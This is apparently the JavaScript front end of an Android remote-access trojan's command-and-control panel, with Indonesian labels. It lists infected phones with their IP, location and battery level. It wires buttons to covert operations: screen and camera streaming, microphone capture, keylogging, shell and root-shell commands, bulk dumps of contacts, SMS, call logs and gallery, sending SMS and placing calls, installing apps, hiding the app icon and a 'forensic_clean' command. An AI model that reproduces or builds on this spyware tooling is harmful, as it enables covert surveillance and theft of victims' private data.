let cur = null, map = null, marker = null, rootMode = false, fps = 0, fpsT = 0;

const log = (box, msg, cls = '') => {
  const b = $(box);
  if (!b) return;
  const d = document.createElement('div');
  d.innerHTML = '<span class="tm">' + fmt.time(Date.now() / 1000) + '</span> <span class="' +
    cls + '">' + esc(msg) + '</span>';
  b.prepend(d);
  while (b.children.length > 250) b.lastChild.remove();
};

$$('#tabs .tab').forEach((t) => {
  t.addEventListener('click', () => {
    $$('#tabs .tab').forEach((x) => x.classList.remove('on'));
    $$('.pane').forEach((p) => p.classList.remove('on'));
    t.classList.add('on');
    $('#' + t.dataset.p).classList.add('on');
    if (t.dataset.p === 'p-loc' && map) setTimeout(() => map.invalidateSize(), 60);
  });
});

function ensureMap() {
  if (map || !window.L) return;
  map = L.map('map', { attributionControl: false, zoomControl: false }).setView([-2.5, 118], 5);
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 }).addTo(map);
}
function setPoint(lat, lon, label) {
  ensureMap();
  if (!map) return;
  $('#coord').textContent = lat + ', ' + lon;
  if (marker) marker.setLatLng([lat, lon]);
  else marker = L.marker([lat, lon]).addTo(map);
  marker.bindPopup(label || 'target').openPopup();
  map.setView([lat, lon], 16);
}

async function loadList() {
  const q = $('#q').value.trim();
  const f = $('#flt').value;
  try {
    const d = await api('/api/targets?status=' + (f === 'web' ? 'all' : f) + '&q=' + encodeURIComponent(q));
    const rows = f === 'web' ? d.targets.filter((t) => t.source === 'web') : d.targets;
    $('#cnt').textContent = rows.length;
    $('#tbOn').textContent = d.stats.online;
    $('#list').innerHTML = rows.map((t) =>
      '<tr data-id="' + esc(t.id) + '"' + (t.id === cur ? ' class="sel"' : '') + '>' +
      '<td style="width:11px"><i class="led ' + (t.online ? (t.source === 'web' ? 'web' : 'on') : '') + '"></i></td>' +
      '<td class="c-id">' + esc(t.id) + '</td>' +
      '<td class="c-name">' + esc(t.label || t.model || '?') +
      '<small>' + esc(t.brand || '') + ' ' + esc(t.sdk ? 'SDK ' + t.sdk : '') + '</small></td>' +
      '<td class="dim">' + esc(t.country || '-') + '</td>' +
      '<td class="c-ip">' + esc(t.ip || '-') + '</td>' +
      '<td class="dim">' + esc(t.android || '-') + '</td>' +
      '<td><span class="bat ' + ((t.battery || 0) < 25 ? 'low' : '') + '"><i><b style="width:' +
      Math.min(100, t.battery || 0) + '%"></b></i>' + (t.battery || 0) + '</span></td>' +
      '<td class="dim">' + fmt.ago(t.last_seen) + '</td></tr>').join('')
      || '<tr><td colspan="8" class="empty">tidak ada client</td></tr>';

    $$('#list tr[data-id]').forEach((r) => {
      r.onclick = () => pick(r.dataset.id);
      r.oncontextmenu = (e) => {
        e.preventDefault();
        pick(r.dataset.id);
        ctxMenu(e.clientX, e.clientY, [
          { k: 'ping', l: 'Ping', i: 'ping' },
          { k: 'screen_start', l: 'Mirror', i: 'screen' },
          { k: 'cam_front', l: 'Kamera depan', i: 'cam' },
          { k: 'locate_start', l: 'Lokasi live', i: 'loc' },
          '-',
          { k: 'shell', l: 'Shell', i: 'shell' },
          { k: 'dumpall', l: 'Dump semua', i: 'dump' },
          '-',
          { k: 'hide_icon', l: 'Sembunyikan ikon', i: 'hide' },
          { k: 'reboot', l: 'Reboot', i: 'power' },
          { k: 'kill_self', l: 'Matikan agent', i: 'kill', danger: true },
        ]);
      };
    });
  } catch (e) { log('#log', 'gagal muat: ' + e.message, 'er'); }
}

async function pick(id) {
  cur = id;
  $$('#list tr').forEach((r) => r.classList.toggle('sel', r.dataset.id === id));
  try {
    const d = await api('/api/targets/' + id);
    const t = d.target;
    $('#pName').innerHTML = esc((t.brand || '') + ' ' + (t.model || '')) + ' <em>&middot; ' + esc(t.id) + '</em>';
    $('#pState').className = 'tag ' + (t.online ? 'on' : '');
    $('#pState').textContent = t.online ? 'ONLINE' : 'OFFLINE';
    $('#pSrc').className = 'tag ' + (t.source === 'web' ? 'cy' : '');
    $('#pSrc').textContent = (t.source || 'apk').toUpperCase();
    $('#stSel').innerHTML = '<b>' + esc(t.label || t.model || t.id) + '</b> &middot; ' + esc(t.ip || '-');
    $('#stInfo').textContent = esc(t.city || '-') + ' ' + esc(t.country || '') + ' \u00b7 ' + (t.battery || 0) + '%';
    $('#infoKv').innerHTML = [
      ['Label', t.label], ['Brand', t.brand], ['Model', t.model], ['Android', t.android],
      ['SDK', t.sdk], ['IP', t.ip], ['ISP', t.isp], ['Negara', t.country], ['Kota', t.city],
      ['Baterai', (t.battery || 0) + '%'], ['Charging', t.charging ? 'ya' : 'tidak'],
      ['Storage', fmt.bytes(t.storage_free)], ['Pertama', fmt.date(t.first_seen)],
      ['Terakhir', fmt.date(t.last_seen)], ['Sumber', t.source || 'apk'], ['Catatan', t.notes || '-'],
    ].map(([k, v]) => '<div class="k">' + esc(k) + '</div><div class="v">' + esc(v ?? '-') + '</div>').join('');
    if (t.lat && t.lon) setPoint(t.lat, t.lon, t.model);
    loadDumps();
  } catch (e) { toast(e.message, 'wn'); }
}

async function cmd(type, args = {}) {
  if (!cur) { toast('Pilih client dulu.', 'wn'); return; }
  try {
    const r = await post('/api/control/' + cur + '/' + type, args);
    log('#log', type + ' \u2192 ' + (r.queued ? 'ANTRI' : 'KIRIM'), r.queued ? 'wn' : 'cy');
  } catch (e) { toast(e.message, 'wn'); }
}

$$('[data-c]').forEach((b) => {
  b.addEventListener('click', () => {
    if (b.dataset.focus) {
      $$('#tabs .tab').forEach((x) => x.classList.toggle('on', x.dataset.p === 'p-term'));
      $$('.pane').forEach((p) => p.classList.toggle('on', p.id === 'p-term'));
      $('#' + b.dataset.focus).focus();
      return;
    }
    cmd(b.dataset.c);
  });
});
$$('[data-k]').forEach((b) => { b.onclick = () => cmd('key', { code: b.dataset.k }); });

$('#txtGo').onclick = () => {
  const v = $('#txtIn').value;
  if (v) { cmd('text', { text: v }); $('#txtIn').value = ''; }
};

$('#vidPlay').onclick = () => cmd('media_push', { url: $('#vidUrl').value, kind: 'video' });
$('#volGo').onclick = () => cmd('volume', { level: Number($('#vol').value) });
$('#wallGo').onclick = () => cmd('wallpaper_set', { url: $('#wallUrl').value });
$('#openGo').onclick = () => cmd('open_url', { url: $('#openUrl').value });

$('#wifiBtn').onclick = () => cmd('wifi_set', { on: true });
$('#dataBtn').onclick = () => cmd('data_set', { on: true });
$('#airBtn').onclick = () => cmd('airplane', { on: true });
$('#dialBtn').onclick = () => cmd('dial', { number: $('#pnum').value });
$('#callBtn').onclick = () => cmd('call', { number: $('#pnum').value });
$('#smsBtn').onclick = () => cmd('sms_send', { number: $('#pnum').value, text: $('#pmsg').value });
$('#apkGo').onclick = () => cmd('app_install', { url: $('#apkUrl').value });
$('#locCopy').onclick = () => copy($('#coord').textContent);

$('#shRun').onclick = () => {
  const c = $('#shCmd').value.trim();
  if (!c) return;
  log('#shOut', '$ ' + c, 'cmd');
  cmd(rootMode ? 'root_shell' : 'shell', { cmd: c });
};
$('#shCmd').onkeydown = (e) => { if (e.key === 'Enter') $('#shRun').click(); };
$('#shRoot').onclick = () => {
  rootMode = !rootMode;
  $('#shRoot').classList.toggle('warn', rootMode);
  toast(rootMode ? 'Mode root aktif' : 'Mode shell biasa', rootMode ? 'ok' : '');
};
$('#shClear').onclick = () => { $('#shOut').innerHTML = ''; };
$('#logClear').onclick = () => { $('#log').innerHTML = ''; };
$('#rf').onclick = loadList;
$('#q').oninput = loadList;
$('#flt').onchange = loadList;

$('#pDel').onclick = async () => {
  if (!cur) return;
  if (!await confirmBox('HAPUS CLIENT', 'Hapus client ini dari C2?')) return;
  await del('/api/targets/' + cur);
  cur = null;
  loadList();
  toast('Client dihapus.', 'ok');
};

$('#mimg').onclick = (e) => {
  const r = e.currentTarget.getBoundingClientRect();
  cmd('tap', {
    x: +((e.clientX - r.left) / r.width).toFixed(4),
    y: +((e.clientY - r.top) / r.height).toFixed(4),
  });
};

async function loadDumps() {
  if (!cur) return;
  try {
    const d = await api('/api/dumps?target=' + cur);
    $('#drows').innerHTML = d.dumps.map((x) =>
      '<tr><td><span class="tag">' + esc(x.kind) + '</span></td>' +
      '<td class="mono">' + esc(x.filename) + '</td><td>' + fmt.bytes(x.size) + '</td>' +
      '<td><a class="btn xs ghost" href="/api/dumps/' + esc(x.id) + '/download">UNDUH</a></td></tr>').join('')
      || '<tr><td colspan="4" class="empty">belum ada</td></tr>';
  } catch {}
}

on('stream', (m) => {
  if (m.target !== cur) return;
  if (m.kind === 'screen' && m.b64) {
    const img = $('#mimg');
    img.hidden = false;
    img.src = 'data:image/jpeg;base64,' + m.b64;
    $('#mirror').classList.add('on');
    const idle = $('#mirror .idle');
    if (idle) idle.remove();
    fps++;
    if (Date.now() - fpsT > 1000) { $('#scrHz').textContent = fps + ' fps'; fps = 0; fpsT = Date.now(); }
  }
  if (m.kind === 'cam' && m.b64) {
    const img = $('#cimg');
    img.hidden = false;
    img.src = 'data:image/jpeg;base64,' + m.b64;
    const idle = $('#camBox .idle');
    if (idle) idle.remove();
  }
  if (m.kind === 'mic' && m.b64) {
    const a = $('#micAudio');
    a.src = 'data:audio/mp4;base64,' + m.b64;
    a.play().catch(() => {});
  }
  if (m.kind === 'loc' && m.meta && m.meta.lat) setPoint(m.meta.lat, m.meta.lon, 'target');
  if (m.kind === 'keylog' && m.b64) log('#keyOut', m.b64, 'ok');
  if (m.kind === 'notif' && m.b64) log('#nlog', m.b64);
});

on('result', (m) => {
  if (m.target !== cur) return;
  const data = m.data || {};
  log('#log', m.id + ' \u2192 ' + (m.ok ? 'OK' : 'GAGAL'), m.ok ? 'ok' : 'er');
  if (data.lat) setPoint(data.lat, data.lon, 'target');
  if (data.output !== undefined) log('#shOut', String(data.output), 'ok');
  if (data.text !== undefined && data.text !== '') log('#clipOut', data.text, 'ok');
  if (data.butuh_izin) log('#log', 'butuh izin WRITE_SETTINGS', 'wn');
  if (data.saved !== undefined) log('#log', 'snapshot: ' + data.saved, data.saved ? 'ok' : 'wn');
  if (Array.isArray(data)) {
    $('#appRows').innerHTML = data.map((x) =>
      '<tr><td class="mono">' + esc(x.pkg) + '</td><td>' + esc(x.name) + '</td>' +
      '<td><button class="btn xs ghost" data-un="' + esc(x.pkg) + '">HAPUS</button></td></tr>').join('');
    $$('[data-un]').forEach((b) => { b.onclick = () => cmd('app_uninstall', { pkg: b.dataset.un }); });
  }
  loadDumps();
});

on('dump', (m) => {
  if (m.target === cur) { log('#dlog', 'dump ' + m.kind + ' \u00b7 ' + fmt.bytes(m.size), 'ok'); loadDumps(); }
});
on('presence', (m) => { loadList(); if (m.id === cur) pick(cur); });
on('targets_dirty', loadList);

window.addEventListener('mzk:cmd', (e) => {
  const k = e.detail;
  if (k === 'dumpall') {
    ['dump_contacts', 'dump_sms', 'dump_calls', 'dump_gallery', 'dump_notif', 'dump_keylog']
      .forEach((c, i) => setTimeout(() => cmd(c), i * 320));
    return;
  }
  if (k === 'broadcast') { location.href = '/admin#broadcast'; return; }
  if (k === 'tunnel') { location.href = '/admin#tunnel'; return; }
  if (k === 'forensic') { cmd('forensic_clean'); return; }
  cmd(k);
});

const p = new URLSearchParams(location.search);
connect();
loadList().then(() => { if (p.get('t')) pick(p.get('t')); });
setInterval(loadList, jitter(11000, 4000));
</script>
</body>
</html>
